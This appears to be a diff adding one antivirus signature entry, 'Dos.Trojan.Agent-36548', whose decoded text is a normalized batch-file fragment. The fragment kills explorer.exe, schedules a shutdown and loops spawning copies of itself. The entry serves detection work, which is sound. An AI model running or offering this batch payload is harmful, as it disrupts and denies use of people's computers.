@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36548
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off >> virus2.bat taskkill /f /im explorer.exe shutdown -s -t 10 :virus >> virus2.bat echo start virus1.bat >> virus2.bat start virus 2.bat goto virus >> virus2.bat
